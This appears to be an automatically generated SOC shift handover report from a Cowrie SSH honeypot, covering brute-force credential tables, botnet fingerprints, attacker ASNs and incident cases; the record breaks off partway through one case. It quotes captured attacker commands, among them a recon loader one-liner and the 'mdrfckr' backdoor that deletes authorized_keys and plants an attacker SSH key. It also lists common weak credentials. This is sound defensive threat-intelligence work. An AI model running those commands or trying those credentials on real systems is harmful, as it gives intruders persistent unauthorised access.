# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-08 |
| **Generated At** | 2026-07-08T06:32:30Z |
| **Shift Time** | 06:32 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **448** |
| Confirmed Threats | **437** |
| False Positives Filtered | **11** (2.5%) |
| Unique Attacker IPs | **99** |
| Countries of Origin | **29** |
| High Severity Cases | **172** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **276** |
| Malware Samples Analyzed | **3** HIGH · **37** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **212** |
| Unique Credential Pairs | **139** |
| Unique Usernames | **33** |
| Unique Passwords | **91** |
| Successful Auth Pairs | **196** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 65 |
| `admin` | 39 |
| `guest` | 12 |
| `support` | 11 |
| `345gs5662d34` | 9 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 9 |
| `3245gs5662d34` | 9 |
| `password` | 9 |
| `support` | 6 |
| `12345678` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 9 |
| `guest` | `1q2w3e` | 6 |
| `operator` | `operator1234567890` | 6 |
| `admin` | `admin55` | 5 |
| `admin` | `Admin1234` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `Admin1234` | `125.20.207.154` | 2026-07-08T02:55:40 |
| `pi` | `support` | `83.166.50.15` | 2026-07-08T02:55:48 |
| `pi` | `support` | `213.230.65.53` | 2026-07-08T02:55:56 |
| `hsj` | `korea2011` | `2.58.172.185` | 2026-07-08T02:55:59 |
| `admin` | `zzidc!@#153150` | `10.0.0.73` | 2026-07-08T02:59:02 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-08T02:59:05 |
| `admin` | `3245gs5662d34` | `10.0.0.73` | 2026-07-08T02:59:06 |
| `admin` | `Admin1234` | `182.151.45.136` | 2026-07-08T02:59:08 |
| `admin` | `Admin1234` | `10.0.0.73` | 2026-07-08T02:59:28 |
| `pi` | `support` | `10.0.0.73` | 2026-07-08T02:59:46 |
| `guest` | `123123123` | `65.20.251.41` | 2026-07-08T03:00:25 |
| `guest` | `123123123` | `91.219.196.17` | 2026-07-08T03:00:37 |
| `test` | `test@2024` | `10.0.0.73` | 2026-07-08T03:00:46 |
| `root` | `﻿------fuck------` | `183.215.27.197` | 2026-07-08T03:00:49 |
| `test` | `3245gs5662d34` | `10.0.0.73` | 2026-07-08T03:00:49 |
| `guest` | `123123123` | `10.0.0.73` | 2026-07-08T03:00:52 |
| `root` | `quick` | `45.198.224.120` | 2026-07-08T03:01:16 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.156.93.245` | 2026-07-08T03:02:22 |
| `*1` | `$4` | `34.156.93.245` | 2026-07-08T03:02:31 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 4127` | `34.156.93.245` | 2026-07-08T03:02:33 |
| `admin` | `admin` | `47.85.8.171` | 2026-07-08T03:02:37 |
| `ubuntu` | `ubuntu@2017` | `10.0.0.73` | 2026-07-08T03:03:34 |
| `ubuntu` | `3245gs5662d34` | `10.0.0.73` | 2026-07-08T03:03:38 |
| `root` | `000000` | `2.57.122.150` | 2026-07-08T03:06:13 |
| `pzuser` | `123456` | `10.0.0.73` | 2026-07-08T03:06:43 |
| `pzuser` | `3245gs5662d34` | `10.0.0.73` | 2026-07-08T03:06:49 |
| `root` | `111111` | `2.57.122.150` | 2026-07-08T03:08:08 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-08T03:09:34 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-08T03:09:34 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-08T03:09:41 |
| `root` | `123` | `2.57.122.150` | 2026-07-08T03:10:04 |
| `root` | `123123` | `2.57.122.150` | 2026-07-08T03:12:03 |
| `root` | `1234` | `2.57.122.150` | 2026-07-08T03:14:03 |
| `root` | `12345` | `2.57.122.150` | 2026-07-08T03:16:06 |
| `root` | `12345678` | `2.57.122.150` | 2026-07-08T03:20:10 |
| `unknown` | `333333333` | `124.239.129.2` | 2026-07-08T03:20:58 |
| `admin` | `admin55` | `103.147.248.44` | 2026-07-08T03:21:17 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-08T03:21:31 |
| `admin` | `admin55` | `182.75.227.178` | 2026-07-08T03:21:31 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-08T03:21:32 |
| `root` | `123456789` | `2.57.122.150` | 2026-07-08T03:22:09 |
| `support` | `redhat123` | `59.34.17.130` | 2026-07-08T03:22:30 |
| `support` | `redhat123` | `196.190.180.18` | 2026-07-08T03:22:38 |
| `guest` | `1q2w3e` | `61.2.228.177` | 2026-07-08T03:23:49 |
| `guest` | `1q2w3e` | `50.217.40.11` | 2026-07-08T03:23:57 |
| `root` | `1q2w3e4r` | `2.57.122.150` | 2026-07-08T03:24:09 |
| `unknown` | `333333333` | `62.182.118.138` | 2026-07-08T03:24:24 |
| `unknown` | `333333333` | `187.218.57.50` | 2026-07-08T03:24:36 |
| `admin` | `admin55` | `185.65.238.250` | 2026-07-08T03:24:51 |
| `admin` | `admin55` | `10.0.0.73` | 2026-07-08T03:25:17 |
| `fin` | `fin` | `102.220.160.39` | 2026-07-08T03:25:49 |
| `root` | `adminpass` | `102.220.160.39` | 2026-07-08T03:25:51 |
| `root` | `synergy` | `102.220.160.39` | 2026-07-08T03:25:54 |
| `sshadmin` | `password` | `10.0.0.73` | 2026-07-08T03:25:57 |
| `sshadmin` | `3245gs5662d34` | `10.0.0.73` | 2026-07-08T03:26:06 |
| `support` | `redhat123` | `111.70.23.245` | 2026-07-08T03:26:13 |
| `root` | `654321` | `2.57.122.150` | 2026-07-08T03:26:13 |
| `root` | `Aa123456...` | `102.220.160.39` | 2026-07-08T03:27:07 |
| `maverick` | `maverick123` | `102.220.160.39` | 2026-07-08T03:27:10 |
| `guest` | `1q2w3e` | `223.210.27.53` | 2026-07-08T03:27:13 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `35.241.189.214` | 2026-07-08T03:27:13 |
| `squid` | `squid` | `102.220.160.39` | 2026-07-08T03:27:15 |
| `guest` | `1q2w3e` | `200.37.179.83` | 2026-07-08T03:27:22 |
| `*1` | `$4` | `35.241.189.214` | 2026-07-08T03:27:27 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 7947` | `35.241.189.214` | 2026-07-08T03:27:29 |
| `guest` | `1q2w3e` | `10.0.0.73` | 2026-07-08T03:27:42 |
| `test` | `test` | `102.220.160.39` | 2026-07-08T03:28:06 |
| `ubuntu` | `secret` | `102.220.160.39` | 2026-07-08T03:28:09 |
| `root` | `P@ssw0rd` | `2.57.122.150` | 2026-07-08T03:28:14 |
| `knopix` | `` | `102.220.160.39` | 2026-07-08T03:28:16 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-08T03:28:26 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-08T03:28:26 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-08T03:28:31 |
| `root` | `sophie` | `185.242.3.195` | 2026-07-08T03:28:45 |
| `sshd` | `` | `102.220.160.39` | 2026-07-08T03:28:47 |
| `user` | `00000` | `10.0.0.73` | 2026-07-08T03:28:50 |
| `ali` | `ali2024` | `102.220.160.39` | 2026-07-08T03:28:55 |
| `root` | `end123` | `102.220.160.39` | 2026-07-08T03:29:08 |
| `admin` | `1q2w3e4R` | `102.220.160.39` | 2026-07-08T03:29:17 |
| `root` | `zaq1XSW@` | `45.198.224.120` | 2026-07-08T03:29:24 |
| `root` | `Pa55w0rd03` | `102.220.160.39` | 2026-07-08T03:29:48 |
| `mysql` | `admin123` | `10.0.0.73` | 2026-07-08T03:29:54 |
| `root` | `admin` | `2.57.122.150` | 2026-07-08T03:30:10 |
| `pi` | `bananapi` | `102.220.160.39` | 2026-07-08T03:30:30 |
| `orangepi` | `orangepi` | `102.220.160.39` | 2026-07-08T03:31:11 |
| `ali` | `11111111` | `102.220.160.39` | 2026-07-08T03:31:53 |
| `root` | `fa` | `102.220.160.39` | 2026-07-08T03:31:58 |
| `root` | `admin123` | `2.57.122.150` | 2026-07-08T03:32:08 |
| `root` | `sophie` | `10.0.0.73` | 2026-07-08T03:32:27 |
| `root` | `passw0rd` | `2.57.122.150` | 2026-07-08T03:34:16 |
| `root` | `password` | `2.57.122.150` | 2026-07-08T03:36:32 |
| `root` | `minecraft` | `45.198.224.120` | 2026-07-08T03:38:24 |
| `root` | `password1` | `2.57.122.150` | 2026-07-08T03:38:38 |
| `root` | `qwerty` | `2.57.122.150` | 2026-07-08T03:40:58 |
| `root` | `root123` | `2.57.122.150` | 2026-07-08T03:42:44 |
| `support` | `support` | `176.53.159.196` | 2026-07-08T03:44:11 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-08T03:44:38 |
| `root` | `toor` | `2.57.122.150` | 2026-07-08T03:45:20 |
| `support` | `support` | `10.0.0.73` | 2026-07-08T03:45:31 |
| `admin` | `admin666` | `119.207.56.116` | 2026-07-08T03:46:56 |
| `config` | `config` | `125.35.109.214` | 2026-07-08T03:47:20 |
| `config` | `config` | `80.233.77.136` | 2026-07-08T03:47:28 |
| `admin` | `000000` | `2.57.122.150` | 2026-07-08T03:48:47 |
| `config` | `config77` | `111.70.29.158` | 2026-07-08T03:50:01 |
| `admin` | `admin666` | `196.190.180.18` | 2026-07-08T03:50:13 |
| `admin` | `111111` | `2.57.122.150` | 2026-07-08T03:50:26 |
| `admin` | `admin666` | `10.0.0.73` | 2026-07-08T03:50:40 |
| `admin` | `123` | `2.57.122.150` | 2026-07-08T03:51:58 |
| `ubnt` | `ubnt1` | `61.2.44.54` | 2026-07-08T03:52:26 |
| `admin` | `123123` | `2.57.122.150` | 2026-07-08T03:53:31 |
| `config` | `config77` | `220.161.52.149` | 2026-07-08T03:54:04 |
| `config` | `config77` | `41.65.118.172` | 2026-07-08T03:54:14 |
| `root` | `mamita` | `172.191.239.155` | 2026-07-08T03:54:37 |
| `345gs5662d34` | `345gs5662d34` | `172.191.239.155` | 2026-07-08T03:54:38 |
| `root` | `3245gs5662d34` | `172.191.239.155` | 2026-07-08T03:54:38 |
| `admin` | `1234` | `2.57.122.150` | 2026-07-08T03:55:03 |
| `admin` | `12345` | `2.57.122.150` | 2026-07-08T03:56:32 |
| `admin` | `123456` | `2.57.122.150` | 2026-07-08T03:57:58 |
| `admin` | `1234567` | `2.57.122.150` | 2026-07-08T03:59:23 |
| `admin` | `12345678` | `2.57.122.150` | 2026-07-08T04:00:49 |
| `root` | `ubuntu` | `95.98.59.198` | 2026-07-08T04:01:51 |
| `admin` | `123456789` | `2.57.122.150` | 2026-07-08T04:02:18 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.76.232.48` | 2026-07-08T04:02:44 |
| `*1` | `$4` | `34.76.232.48` | 2026-07-08T04:02:57 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 8612` | `34.76.232.48` | 2026-07-08T04:02:59 |
| `root` | `P@ssword12#$` | `45.198.224.120` | 2026-07-08T04:03:18 |
| `admin` | `1q2w3e4r` | `2.57.122.150` | 2026-07-08T04:03:45 |
| `admin` | `654321` | `2.57.122.150` | 2026-07-08T04:05:13 |
| `admin` | `Admin123` | `2.57.122.150` | 2026-07-08T04:06:43 |
| `admin` | `P@ssw0rd` | `2.57.122.150` | 2026-07-08T04:08:11 |
| `admin` | `admin` | `2.57.122.150` | 2026-07-08T04:09:41 |
| `admin` | `passw0rd` | `2.57.122.150` | 2026-07-08T04:11:10 |
| `admin` | `password` | `2.57.122.150` | 2026-07-08T04:12:38 |
| `admin` | `password1` | `2.57.122.150` | 2026-07-08T04:14:05 |
| `admin` | `password` | `76.133.97.153` | 2026-07-08T04:14:57 |
| `admin` | `password` | `58.17.128.7` | 2026-07-08T04:15:06 |
| `admin` | `qwerty` | `2.57.122.150` | 2026-07-08T04:15:34 |
| `operator` | `operator1234567890` | `182.73.164.228` | 2026-07-08T04:15:58 |
| `operator` | `operator1234567890` | `122.187.228.228` | 2026-07-08T04:16:09 |
| `support` | `Support12345` | `183.171.53.82` | 2026-07-08T04:16:32 |
| `support` | `Support12345` | `203.123.219.137` | 2026-07-08T04:16:42 |
| `support` | `Support12345` | `10.0.0.73` | 2026-07-08T04:16:59 |
| `admin1` | `123123` | `2.57.122.150` | 2026-07-08T04:17:01 |
| `root` | `123@@@` | `146.56.164.20` | 2026-07-08T04:17:48 |
| `root` | `LeitboGi0ro` | `146.56.164.20` | 2026-07-08T04:17:48 |
| `admin1` | `12345` | `2.57.122.150` | 2026-07-08T04:18:33 |
| `operator` | `operator1234567890` | `85.105.255.56` | 2026-07-08T04:19:25 |
| `operator` | `operator1234567890` | `103.68.22.140` | 2026-07-08T04:19:38 |
| `operator` | `operator1234567890` | `10.0.0.73` | 2026-07-08T04:19:49 |
| `admin1` | `123456` | `2.57.122.150` | 2026-07-08T04:20:05 |
| `admin1` | `password` | `2.57.122.150` | 2026-07-08T04:21:37 |
| `administrator` | `123123` | `2.57.122.150` | 2026-07-08T04:23:13 |
| `root` | `Password10` | `185.242.3.195` | 2026-07-08T04:23:54 |
| `administrator` | `12345` | `2.57.122.150` | 2026-07-08T04:24:57 |
| `administrator` | `123456` | `2.57.122.150` | 2026-07-08T04:26:46 |
| `administrator` | `1234567` | `2.57.122.150` | 2026-07-08T04:28:38 |
| `root` | `qweewq` | `45.198.224.120` | 2026-07-08T04:29:15 |
| `administrator` | `12345678` | `2.57.122.150` | 2026-07-08T04:30:39 |
| `administrator` | `123456789` | `2.57.122.150` | 2026-07-08T04:32:16 |
| `administrator` | `password` | `2.57.122.150` | 2026-07-08T04:33:42 |
| `apache` | `12345678` | `2.57.122.150` | 2026-07-08T04:35:08 |
| `apache` | `password` | `2.57.122.150` | 2026-07-08T04:36:38 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236` | `72.14.178.148` | 2026-07-08T04:37:05 |
| `backup` | `123` | `2.57.122.150` | 2026-07-08T04:38:09 |
| `backup` | `12345678` | `2.57.122.150` | 2026-07-08T04:39:43 |
| `backup` | `backup` | `2.57.122.150` | 2026-07-08T04:41:22 |
| `root` | `Abc123456` | `117.71.53.210` | 2026-07-08T04:41:48 |
| `root` | `Abc123456` | `14.39.99.2` | 2026-07-08T04:41:58 |
| `root` | `123qwe123qwe` | `188.36.7.196` | 2026-07-08T04:42:13 |
| `root` | `P@ssw0rd3` | `164.92.96.91` | 2026-07-08T04:42:18 |
| `345gs5662d34` | `345gs5662d34` | `164.92.96.91` | 2026-07-08T04:42:20 |
| `root` | `3245gs5662d34` | `164.92.96.91` | 2026-07-08T04:42:20 |
| `root` | `123qwe123qwe` | `111.70.23.240` | 2026-07-08T04:42:21 |
| `support` | `fuckyou` | `117.69.255.239` | 2026-07-08T04:42:56 |
| `support` | `fuckyou` | `179.185.1.97` | 2026-07-08T04:43:05 |
| `backup` | `backup123` | `2.57.122.150` | 2026-07-08T04:43:06 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `192.155.90.118` | 2026-07-08T04:43:46 |
| `guest` | `qwerty12` | `218.25.233.22` | 2026-07-08T04:44:30 |
| `guest` | `qwerty12` | `181.129.31.42` | 2026-07-08T04:44:38 |
| `guest` | `qwerty12` | `10.0.0.73` | 2026-07-08T04:44:58 |
| `backup` | `password` | `2.57.122.150` | 2026-07-08T04:45:01 |
| `root` | `Abc123456` | `10.0.0.73` | 2026-07-08T04:45:27 |
| `root` | `morgan` | `45.198.224.120` | 2026-07-08T04:46:18 |
| `centos` | `12345678` | `2.57.122.150` | 2026-07-08T04:46:45 |
| `root` | `Lky123456` | `222.71.205.34` | 2026-07-08T04:46:52 |
| `centos` | `654321` | `2.57.122.150` | 2026-07-08T04:48:37 |
| `root` | `qwerty654321` | `161.35.65.86` | 2026-07-08T04:48:56 |
| `345gs5662d34` | `345gs5662d34` | `161.35.65.86` | 2026-07-08T04:48:58 |
| `root` | `3245gs5662d34` | `161.35.65.86` | 2026-07-08T04:48:59 |
| `root` | `qwe@123456` | `20.157.117.15` | 2026-07-08T04:49:18 |
| `345gs5662d34` | `345gs5662d34` | `20.157.117.15` | 2026-07-08T04:49:22 |
| `root` | `3245gs5662d34` | `20.157.117.15` | 2026-07-08T04:49:23 |
| `centos` | `centos` | `2.57.122.150` | 2026-07-08T04:50:22 |
| `centos` | `centos123` | `2.57.122.150` | 2026-07-08T04:51:48 |
| `debian` | `111111` | `2.57.122.150` | 2026-07-08T04:53:13 |
| `debian` | `123123` | `2.57.122.150` | 2026-07-08T04:54:39 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **448** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 77 |
| OpenSSH | 44 |
| libssh | 41 |
| Paramiko (Python) | 11 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 63 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 43 | 42 |
| `4ed0d5b0dc3b...` | Mirai/variant | 19 | 1 |
| `f555226df196...` | Mirai/variant | 13 | 5 |
| `16443846184e...` | Generic scanner | 10 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 63 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 43 | 42 | Mirai/variant |
| `4ed0d5b0dc3b...` | libssh | 19 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 13 | 5 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 10 | 3 | Generic scanner |
| `95420f9d932d...` | libssh | 9 | 4 | — |
| `a2de0f306611...` | Paramiko (Python) | 9 | 3 | Mirai/variant |
| `6372ee695756...` | Paramiko (Python) | 2 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **9** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 62 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.150`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `164.92.96.91`, `172.191.239.155`, `161.35.65.86`, `20.157.117.15`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **99** |
| Unique ASNs | **61** |
| High-Risk ASNs | **56** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 7 | HIGH |
| `AS396982` | Google LLC | 5 | HIGH |
| `AS46562` | Performive LLC | 5 | MEDIUM |
| `AS398324` | Censys, Inc. | 4 | HIGH |
| `AS14061` | DigitalOcean, LLC | 4 | HIGH |
| `AS31898` | Oracle Corporation | 4 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 4 | HIGH |
| `AS17421` | Mobile Business Group | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (171)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b0e712f63de5

| Field | Detail |
|---|---|
| **Source IP** | `125.20.207[.]154` |
| **First Seen** | 2026-07-08 02:55 |
| **Last Seen** | 2026-07-08 02:55 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 02:55:30` | `cowrie.session.connect` |
| `2026-07-08 02:55:34` | `cowrie.client.version` |
| `2026-07-08 02:55:34` | `cowrie.client.kex` |
| `2026-07-08 02:55:40` | `cowrie.login.success` |
| `2026-07-08 02:55:42` | `cowrie.direct-tcpip.request` |
| `2026-07-08 02:55:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.20.207[.]154` to AbuseIPDB if not already reported
- [ ] Block `125.20.207[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f63c8db74bf

| Field | Detail |
|---|---|
| **Source IP** | `83.166.50[.]15` |
| **First Seen** | 2026-07-08 02:55 |
| **Last Seen** | 2026-07-08 02:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 02:55:45` | `cowrie.session.connect` |
| `2026-07-08 02:55:46` | `cowrie.client.version` |
| `2026-07-08 02:55:46` | `cowrie.client.kex` |
| `2026-07-08 02:55:48` | `cowrie.login.success` |
| `2026-07-08 02:55:48` | `cowrie.direct-tcpip.request` |
| `2026-07-08 02:55:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.166.50[.]15` to AbuseIPDB if not already reported
- [ ] Block `83.166.50[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-320d443a2e3f

| Field | Detail |
|---|---|
| **Source IP** | `213.230.65[.]53` |
| **First Seen** | 2026-07-08 02:55 |
| **Last Seen** | 2026-07-08 02:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 02:55:53` | `cowrie.session.connect` |
| `2026-07-08 02:55:54` | `cowrie.client.version` |
| `2026-07-08 02:55:54` | `cowrie.client.kex` |
| `2026-07-08 02:55:56` | `cowrie.login.success` |
| `2026-07-08 02:55:56` | `cowrie.direct-tcpip.request` |
| `2026-07-08 02:56:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.65[.]53` to AbuseIPDB if not already reported
- [ ] Block `213.230.65[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-861285ddc0a6

| Field | Detail |
|---|---|
| **Source IP** | `2.58.172[.]185` |
| **First Seen** | 2026-07-08 02:55 |
| **Last Seen** | 2026-07-08 02:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 02:55:59` | `cowrie.session.connect` |
| `2026-07-08 02:55:59` | `cowrie.client.version` |
| `2026-07-08 02:55:59` | `cowrie.client.kex` |
| `2026-07-08 02:55:59` | `cowrie.login.success` |
| `2026-07-08 02:56:00` | `cowrie.session.params` |
| `2026-07-08 02:56:00` | `cowrie.command.input` |
| `2026-07-08 02:56:00` | `cowrie.log.closed` |
| `2026-07-08 02:56:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.58.172[.]185` to AbuseIPDB if not already reported
- [ ] Block `2.58.172[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb5012d615ad

| Field | Detail |
|---|---|
| **Source IP** | `182.151.45[.]136` |
| **First Seen** | 2026-07-08 02:59 |
| **Last Seen** | 2026-07-08 02:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 02:59:04` | `cowrie.session.connect` |
| `2026-07-08 02:59:05` | `cowrie.client.version` |
| `2026-07-08 02:59:05` | `cowrie.client.kex` |
| `2026-07-08 02:59:08` | `cowrie.login.success` |
| `2026-07-08 02:59:09` | `cowrie.direct-tcpip.request` |
| `2026-07-08 02:59:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.151.45[.]136` to AbuseIPDB if not already reported
- [ ] Block `182.151.45[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5a8d4dffde2

| Field | Detail |
|---|---|
| **Source IP** | `65.20.251[.]41` |
| **First Seen** | 2026-07-08 03:00 |
| **Last Seen** | 2026-07-08 03:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:00:24` | `cowrie.session.connect` |
| `2026-07-08 03:00:25` | `cowrie.client.version` |
| `2026-07-08 03:00:25` | `cowrie.client.kex` |
| `2026-07-08 03:00:25` | `cowrie.login.success` |
| `2026-07-08 03:00:26` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:00:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.251[.]41` to AbuseIPDB if not already reported
- [ ] Block `65.20.251[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7070c4836fb7

| Field | Detail |
|---|---|
| **Source IP** | `91.219.196[.]17` |
| **First Seen** | 2026-07-08 03:00 |
| **Last Seen** | 2026-07-08 03:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:00:35` | `cowrie.session.connect` |
| `2026-07-08 03:00:36` | `cowrie.client.version` |
| `2026-07-08 03:00:36` | `cowrie.client.kex` |
